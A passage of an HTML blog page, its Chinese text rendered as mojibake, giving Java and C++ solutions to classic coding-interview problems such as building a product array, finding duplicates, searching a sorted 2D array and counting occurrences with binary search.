href="#%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91%E7%9A%84%E5%90%8E%E5%BA%8F%E9%81%8D%E5%8E%86%E5%BA%8F%E5%88%97">äºŒå‰æœç´¢æ ‘çš„ååºéå†åºåˆ— âˆš</a></li></ul></li><li><a href="#%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE">äºŒåˆ†æŸ¥æ‰¾</a><ul><li><a href="#%E6%97%8B%E8%BD%AC%E6%95%B0%E7%BB%84%E7%9A%84%E6%9C%80%E5%B0%8F%E6%95%B0%E5%AD%97">æ—‹è½¬æ•°ç»„çš„æœ€å°æ•°å­— âˆš</a></li></ul></li><li><a href="#%E6%90%9C%E7%B4%A2">æœç´¢</a><ul><li><a href="#%E7%9F%A9%E9%98%B5%E4%B8%AD%E7%9A%84%E8%B7%AF%E5%BE%84">çŸ©é˜µä¸­çš„è·¯å¾„ âˆš</a></li><li><a href="#%E6%9C%BA%E5%99%A8%E4%BA%BA%E7%9A%84%E8%BF%90%E5%8A%A8%E8%8C%83%E5%9B%B4">æœºå™¨äººçš„è¿åŠ¨èŒƒå›´ âˆš</a></li></ul></li><li><a href="#%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97-1">æ ˆå’Œé˜Ÿåˆ—</a><ul><li><a href="#%E7%94%A8%E4%B8%A4%E4%B8%AA%E6%A0%88%E5%AE%9E%E7%8E%B0%E9%98%9F%E5%88%97">ç”¨ä¸¤ä¸ªæ ˆå®ç°é˜Ÿåˆ— âˆš</a></li></ul></li><li><a href="#%E4%BD%8D%E8%BF%90%E7%AE%97">ä½è¿ç®—</a><ul><li><a href="#%E4%B8%8D%E7%94%A8%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E5%81%9A%E5%8A%A0%E6%B3%95">ä¸ç”¨åŠ å‡ä¹˜é™¤åšåŠ æ³• Ã—</a></li><li><a href="#%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%B8%AD1%E7%9A%84%E4%B8%AA%E6%95%B0">äºŒè¿›åˆ¶ä¸­1çš„ä¸ªæ•° Ã—</a></li><li><a href="#%E6%95%B0%E7%BB%84%E4%B8%AD%E5%8F%AA%E5%87%BA%E7%8E%B0%E4%B8%80%E6%AC%A1%E7%9A%84%E6%95%B0%E5%AD%97">æ•°ç»„ä¸­åªå‡ºç°ä¸€æ¬¡çš„æ•°å­— Ã—</a></li></ul></li><li><a href="#%E5%85%B6%E4%BB%96">å…¶ä»–</a><ul><li><a href="#%E6%B1%82123n">æ±‚1+2+3+â€¦+n Ã—</a></li><li><a href="#%E6%95%B0%E6%8D%AE%E6%B5%81%E7%9A%84%E4%B8%AD%E4%BD%8D%E6%95%B0-">æ•°æ®æµçš„ä¸­ä½æ•° -</a></li><li><a href="#%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3%E7%9A%84%E6%9C%80%E5%A4%A7%E5%80%BC-">æ»‘åŠ¨çª—å£çš„æœ€å¤§å€¼ -</a></li><li><a href="#%E5%AD%A9%E5%AD%90%E4%BB%AC%E7%9A%84%E6%B8%B8%E6%88%8F">å­©å­ä»¬çš„æ¸¸æˆ Ã—</a></li><li><a href="#%E6%95%B0%E5%80%BC%E7%9A%84%E6%95%B4%E6%95%B0%E6%AC%A1%E6%96%B9">æ•°å€¼çš„æ•´æ•°æ¬¡æ–¹ âˆš</a></li><li><a href="#%E6%95%B4%E6%95%B0%E4%B8%AD1%E5%87%BA%E7%8E%B0%E7%9A%84%E6%AC%A1%E6%95%B0">æ•´æ•°ä¸­1å‡ºç°çš„æ¬¡æ•° Ã—</a></li></ul></li></ul><!-- tocstop --><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">* <span class="comment">//æ²¡æœ‰æ€è·¯</span></span><br><span class="line">? <span class="comment">//æœ‰æ€è·¯åšä¸å‡ºæ¥</span></span><br><span class="line">- <span class="comment">//å·®ä¸€ç‚¹</span></span><br><span class="line">âˆš <span class="comment">//å®Œç¾è§£å†³</span></span><br></pre></td></tr></table></figure><h1><span id="æ•°ç»„">æ•°ç»„</span></h1><h2><span id="æ„å»ºä¹˜ç§¯æ•°ç»„-">æ„å»ºä¹˜ç§¯æ•°ç»„ -âˆš</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span>[] multiply(<span class="type">int</span>[] A) &#123;</span><br><span class="line">       <span class="type">int</span>[] B = <span class="keyword">new</span> <span class="title class_">int</span>[A.length];</span><br><span class="line">       <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>,product=<span class="number">1</span>;i&lt;A.length;product*=A[i],i++)&#123;</span><br><span class="line">           B[i]=product;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">for</span>(<span class="type">int</span> i=A.length-<span class="number">1</span>,product = <span class="number">1</span>; i &gt;= <span class="number">0</span>;product *= A[i],i--)&#123;</span><br><span class="line">           B[i]*=product;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> B;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">multiply</span><span class="params">(<span class="type">const</span> vector&lt;<span class="type">int</span>&gt;&amp; A)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">auto</span> len = A.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt;<span class="built_in">v</span>(len, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>, product = <span class="number">1</span>; i &lt; len;  product *= A[i++]) &#123;</span><br><span class="line">            v[i] = product;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = len - <span class="number">1</span>, product = <span class="number">1</span>; i &gt;= <span class="number">0</span>;  product *= A[i--]) &#123;</span><br><span class="line">            v[i] *= product;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> v;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2><span id="æ•°ç»„ä¸­é‡å¤çš„æ•°å­—">æ•°ç»„ä¸­é‡å¤çš„æ•°å­— âˆš</span></h2><p>åœ¨ä¸€ä¸ªé•¿åº¦ä¸ºnçš„æ•°ç»„é‡Œçš„æ‰€æœ‰æ•°å­—éƒ½åœ¨0åˆ°n-1çš„èŒƒå›´å†…ã€‚ æ•°ç»„ä¸­æŸäº›æ•°å­—æ˜¯é‡å¤çš„ï¼Œä½†ä¸çŸ¥é“æœ‰å‡ ä¸ªæ•°å­—æ˜¯é‡å¤çš„ã€‚ä¹Ÿä¸çŸ¥é“æ¯ä¸ªæ•°å­—é‡å¤å‡ æ¬¡ã€‚è¯·æ‰¾å‡ºæ•°ç»„ä¸­ä»»æ„ä¸€ä¸ªé‡å¤çš„æ•°å­—ã€‚ ä¾‹å¦‚ï¼Œå¦‚æœè¾“å…¥é•¿åº¦ä¸º7çš„æ•°ç»„{2,3,1,0,2,5,3}ï¼Œé‚£ä¹ˆå¯¹åº”çš„è¾“å‡ºæ˜¯ç¬¬ä¸€ä¸ªé‡å¤çš„æ•°å­—2ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">duplicate</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> length, <span class="type">int</span>[] duplication)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (nums == <span class="literal">null</span> || length &lt;= <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">        <span class="keyword">while</span> (nums[i] != i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[i] == nums[nums[i]]) &#123;</span><br><span class="line">                duplication[<span class="number">0</span>] = nums[i];</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            swap(nums, i, nums[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">swap</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> i, <span class="type">int</span> j)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">t</span> <span class="operator">=</span> nums[i];</span><br><span class="line">    nums[i] = nums[j];</span><br><span class="line">    nums[j] = t;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="äºŒç»´æ•°ç»„çš„æŸ¥æ‰¾">äºŒç»´æ•°ç»„çš„æŸ¥æ‰¾ âˆš</span></h2><p>åœ¨ä¸€ä¸ªäºŒç»´æ•°ç»„ä¸­ï¼ˆæ¯ä¸ªä¸€ç»´æ•°ç»„çš„é•¿åº¦ç›¸åŒï¼‰ï¼Œæ¯ä¸€è¡Œéƒ½æŒ‰ç…§ä»å·¦åˆ°å³é€’å¢çš„é¡ºåºæ’åºï¼Œæ¯ä¸€åˆ—éƒ½æŒ‰ç…§ä»ä¸Šåˆ°ä¸‹é€’å¢çš„é¡ºåºæ’åºã€‚è¯·å®Œæˆä¸€ä¸ªå‡½æ•°ï¼Œè¾“å…¥è¿™æ ·çš„ä¸€ä¸ªäºŒç»´æ•°ç»„å’Œä¸€ä¸ªæ•´æ•°ï¼Œåˆ¤æ–­æ•°ç»„ä¸­æ˜¯å¦å«æœ‰è¯¥æ•´æ•°ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">Find</span><span class="params">(<span class="type">int</span> target, <span class="type">int</span> [][] array)</span> &#123;</span><br><span class="line">        <span class="type">int</span> col=array[<span class="number">0</span>].length-<span class="number">1</span>,row=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(col&gt;=<span class="number">0</span>&amp;&amp;row&lt;=array.length-<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(array[row][col]&lt;target) row++;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(array[row][col]==target) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">else</span> col--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2><span id="è¡¨ç¤ºæ•°å€¼çš„å­—ç¬¦ä¸²-">è¡¨ç¤ºæ•°å€¼çš„å­—ç¬¦ä¸² -</span></h2><p>è¯·å®ç°ä¸€ä¸ªå‡½æ•°ç”¨æ¥åˆ¤æ–­å­—ç¬¦ä¸²æ˜¯å¦è¡¨ç¤ºæ•°å€¼ï¼ˆåŒ…æ‹¬æ•´æ•°å’Œå°æ•°ï¼‰ã€‚ä¾‹å¦‚ï¼Œå­—ç¬¦ä¸²â€+100â€,â€5e2â€,â€-123â€,â€3.1416â€å’Œâ€-1E-16â€éƒ½è¡¨ç¤ºæ•°å€¼ã€‚ ä½†æ˜¯â€12eâ€,â€1a3.14â€,â€1.2.3â€,â€+-5â€å’Œâ€12e+4.3â€éƒ½ä¸æ˜¯ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[]  ï¼š å­—ç¬¦é›†åˆ</span><br><span class="line">()  ï¼š åˆ†ç»„</span><br><span class="line">?   ï¼š é‡å¤ <span class="number">0</span> ~ <span class="number">1</span> æ¬¡</span><br><span class="line">+   ï¼š é‡å¤ <span class="number">1</span> ~ n æ¬¡</span><br><span class="line">*   ï¼š é‡å¤ <span class="number">0</span> ~ n æ¬¡</span><br><span class="line">.   ï¼š ä»»æ„å­—ç¬¦</span><br><span class="line">\\. ï¼š è½¬ä¹‰åçš„ .</span><br><span class="line">\\d ï¼š æ•°å­—</span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isNumeric</span><span class="params">(<span class="type">char</span>[] str)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (str == <span class="literal">null</span> || str.length == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(str).matches(<span class="string">&quot;[+-]?\\d*(\\.\\d+)?([eE][+-]?\\d+)?&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="å’Œä¸ºsçš„ä¸¤ä¸ªæ•°å­—">å’Œä¸ºSçš„ä¸¤ä¸ªæ•°å­— âˆš</span></h2><p>è¾“å…¥ä¸€ä¸ªé€’å¢æ’åºçš„æ•°ç»„å’Œä¸€ä¸ªæ•°å­—Sï¼Œåœ¨æ•°ç»„ä¸­æŸ¥æ‰¾ä¸¤ä¸ªæ•°ï¼Œä½¿å¾—ä»–ä»¬çš„å’Œæ­£å¥½æ˜¯Sï¼Œå¦‚æœæœ‰å¤šå¯¹æ•°å­—çš„å’Œç­‰äºSï¼Œè¾“å‡ºä¸¤ä¸ªæ•°çš„ä¹˜ç§¯æœ€å°çš„ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> ArrayList&lt;Integer&gt; <span class="title function_">FindNumbersWithSum</span><span class="params">(<span class="type">int</span> [] array,<span class="type">int</span> sum)</span> &#123;</span><br><span class="line">        ArrayList&lt;Integer&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">        <span class="keyword">if</span>(array.length==<span class="number">0</span>) <span class="keyword">return</span> res;</span><br><span class="line">        <span class="type">int</span> lo=<span class="number">0</span>,hi=array.length-<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(hi&gt;lo)&#123;</span><br><span class="line">            <span class="keyword">if</span>(array[lo]+array[hi]==sum)&#123;</span><br><span class="line">                res.add(array[lo]);</span><br><span class="line">                res.add(array[hi]);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(array[lo]+array[hi]&gt;sum) hi--;</span><br><span class="line">            <span class="keyword">else</span> lo++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2><span id="å’Œä¸ºsçš„è¿ç»­æ­£æ•°åºåˆ—">å’Œä¸ºSçš„è¿ç»­æ­£æ•°åºåˆ— âˆš</span></h2><p>å°æ˜å¾ˆå–œæ¬¢æ•°å­¦,æœ‰ä¸€å¤©ä»–åœ¨åšæ•°å­¦ä½œä¸šæ—¶,è¦æ±‚è®¡ç®—å‡º9~16çš„å’Œ,ä»–é©¬ä¸Šå°±å†™å‡ºäº†æ­£ç¡®ç­”æ¡ˆæ˜¯100ã€‚ä½†æ˜¯ä»–å¹¶ä¸æ»¡è¶³äºæ­¤,ä»–åœ¨æƒ³ç©¶ç«Ÿæœ‰å¤šå°‘ç§è¿ç»­çš„æ­£æ•°åºåˆ—çš„å’Œä¸º100(è‡³å°‘åŒ…æ‹¬ä¸¤ä¸ªæ•°)ã€‚æ²¡å¤šä¹…,ä»–å°±å¾—åˆ°å¦ä¸€ç»„è¿ç»­æ­£æ•°å’Œä¸º100çš„åºåˆ—:18,19,20,21,22ã€‚ç°åœ¨æŠŠé—®é¢˜äº¤ç»™ä½ ,ä½ èƒ½ä¸èƒ½ä¹Ÿå¾ˆå¿«çš„æ‰¾å‡ºæ‰€æœ‰å’Œä¸ºSçš„è¿ç»­æ­£æ•°åºåˆ—? Good Luck!</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ArrayList&lt;ArrayList&lt;Integer&gt; &gt; FindContinuousSequence(<span class="type">int</span> sum) &#123;</span><br><span class="line">       <span class="type">int</span> lo=<span class="number">1</span>,hi=<span class="number">1</span>;</span><br><span class="line">        ArrayList&lt;ArrayList&lt;Integer&gt; &gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">        <span class="keyword">while</span>(hi&lt;sum&amp;&amp;hi&gt;=lo)&#123;</span><br><span class="line">            <span class="keyword">if</span>(cal(lo,hi)&lt;sum)&#123;</span><br><span class="line">                hi++;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(cal(lo,hi)&gt;sum)&#123;</span><br><span class="line">                lo++;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                res.add(rec(lo,hi));</span><br><span class="line">                hi++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">cal</span><span class="params">(<span class="type">int</span> lo, <span class="type">int</span> hi)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (lo+hi)*(hi-lo+<span class="number">1</span>)/<span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ArrayList&lt;Integer&gt; <span class="title function_">rec</span><span class="params">(<span class="type">int</span> lo,<span class="type">int</span> hi)</span>&#123;</span><br><span class="line">         ArrayList&lt;Integer&gt; res=<span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=lo;i&lt;=hi;i++) res.add(i);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="æ‰‘å…‹ç‰Œé¡ºå­">æ‰‘å…‹ç‰Œé¡ºå­ âˆš</span></h2><p>LLä»Šå¤©å¿ƒæƒ…ç‰¹åˆ«å¥½,å› ä¸ºä»–å»ä¹°äº†ä¸€å‰¯æ‰‘å…‹ç‰Œ,å‘ç°é‡Œé¢å±…ç„¶æœ‰2ä¸ªå¤§ç‹,2ä¸ªå°ç‹(ä¸€å‰¯ç‰ŒåŸæœ¬æ˜¯54å¼ ^_^)â€¦ä»–éšæœºä»ä¸­æŠ½å‡ºäº†5å¼ ç‰Œ,æƒ³æµ‹æµ‹è‡ªå·±çš„æ‰‹æ°”,çœ‹çœ‹èƒ½ä¸èƒ½æŠ½åˆ°é¡ºå­,å¦‚æœæŠ½åˆ°çš„è¯,ä»–å†³å®šå»ä¹°ä½“è‚²å½©ç¥¨,å˜¿å˜¿ï¼ï¼â€œçº¢å¿ƒA,é»‘æ¡ƒ3,å°ç‹,å¤§ç‹,æ–¹ç‰‡5â€,â€œOh My God!â€ä¸æ˜¯é¡ºå­â€¦..LLä¸é«˜å…´äº†,ä»–æƒ³äº†æƒ³,å†³å®šå¤§\å° ç‹å¯ä»¥çœ‹æˆä»»ä½•æ•°å­—,å¹¶ä¸”Açœ‹ä½œ1,Jä¸º11,Qä¸º12,Kä¸º13ã€‚ä¸Šé¢çš„5å¼ ç‰Œå°±å¯ä»¥å˜æˆâ€œ1,2,3,4,5â€(å¤§å°ç‹åˆ†åˆ«çœ‹ä½œ2å’Œ4),â€œSo Lucky!â€ã€‚LLå†³å®šå»ä¹°ä½“è‚²å½©ç¥¨å•¦ã€‚ ç°åœ¨,è¦æ±‚ä½ ä½¿ç”¨è¿™å¹…ç‰Œæ¨¡æ‹Ÿä¸Šé¢çš„è¿‡ç¨‹,ç„¶åå‘Šè¯‰æˆ‘ä»¬LLçš„è¿æ°”å¦‚ä½•ï¼Œ å¦‚æœç‰Œèƒ½ç»„æˆé¡ºå­å°±è¾“å‡ºtrueï¼Œå¦åˆ™å°±è¾“å‡ºfalseã€‚ä¸ºäº†æ–¹ä¾¿èµ·è§,ä½ å¯ä»¥è®¤ä¸ºå¤§å°ç‹æ˜¯0ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isContinuous</span><span class="params">(<span class="type">int</span> [] numbers)</span> &#123;</span><br><span class="line">       <span class="keyword">if</span>(numbers.length==<span class="number">0</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">       Arrays.sort(numbers);</span><br><span class="line">       <span class="type">int</span> cnt=<span class="number">0</span>;</span><br><span class="line">       <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;numbers.length;i++)</span><br><span class="line">           <span class="keyword">if</span>(numbers[i]==<span class="number">0</span>) cnt++;</span><br><span class="line">       <span class="keyword">for</span>(<span class="type">int</span> i=cnt;i&lt;numbers.length-<span class="number">1</span>;i++)&#123;</span><br><span class="line">           <span class="keyword">if</span>(numbers[i]==numbers[i+<span class="number">1</span>]) <span class="keyword">return</span> <span class="literal">false</span>;            </span><br><span class="line">           cnt-=numbers[i+<span class="number">1</span>]-numbers[i]-<span class="number">1</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> cnt&gt;=<span class="number">0</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2><span id="è°ƒæ•´æ•°ç»„é¡ºåºä½¿å¥‡æ•°ä½äºå¶æ•°å‰é¢">è°ƒæ•´æ•°ç»„é¡ºåºä½¿å¥‡æ•°ä½äºå¶æ•°å‰é¢ âˆš</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">reOrderArray</span><span class="params">(<span class="type">int</span> [] array)</span> &#123;</span><br><span class="line">       <span class="type">int</span> j=<span class="number">0</span>, i=<span class="number">0</span>;</span><br><span class="line">       <span class="keyword">for</span>(;i&lt;array.length;i++)&#123;</span><br><span class="line">           <span class="keyword">if</span>(array[i]%<span class="number">2</span>==<span class="number">1</span>) j++;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="type">int</span>[] copy = array.clone();</span><br><span class="line">       i=<span class="number">0</span>;</span><br><span class="line">       <span class="keyword">for</span>(<span class="type">int</span> c:copy)&#123;</span><br><span class="line">           <span class="keyword">if</span>(c%<span class="number">2</span>==<span class="number">0</span>) array[j++]=c;</span><br><span class="line">           <span class="keyword">else</span> array[i++]=c;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2><span id="æ•°å­—åœ¨æ’åºæ•°ç»„ä¸­å‡ºç°çš„æ¬¡æ•°">æ•°å­—åœ¨æ’åºæ•°ç»„ä¸­å‡ºç°çš„æ¬¡æ•° âˆš</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">GetNumberOfK</span><span class="params">(<span class="type">int</span> [] array , <span class="type">int</span> k)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(array.length==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      <span class="type">int</span> left=BS(array,k);</span><br><span class="line">      <span class="keyword">if</span>(array[left]!=k) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      <span class="type">int</span> right=BS(array,k+<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> array[right]==k?right-left+<span class="number">1</span>:right-left;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">BS</span><span class="params">(<span class="type">int</span>[] a,<span class="type">int</span> k)</span>&#123;</span><br><span class="line">        <span class="type">int</span> lo=<span class="number">0</span>,hi=a.length-<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(lo&lt;hi)&#123;</span><br><span class="line">            <span class="type">int</span> mid=lo+(hi-lo)/<span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>(a[mid]&lt;k)lo=mid+<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">else</span> hi=mid;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> lo;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2><span id="æœ€å°çš„kä¸ªæ•°-">æœ€å°çš„kä¸ªæ•° -âˆš</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ArrayList&lt;Integer&gt; <span class="title function_">GetLeastNumbers_Solution</span><span class="params">(<span class="type">int</span> [] input, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">         ArrayList&lt;Integer&gt; res=<span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">        <span class="keyword">if</span>(input==<span class="literal">null</span>||input.length==<span class="number">0</span>||k&lt;=<span class="number">0</span>||k&gt;input.length) <span class="keyword">return</span> res;</span><br><span class="line">        qs(input,k-<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;k;i++) res.add(input[i]);</span><br><span class="line">        <span 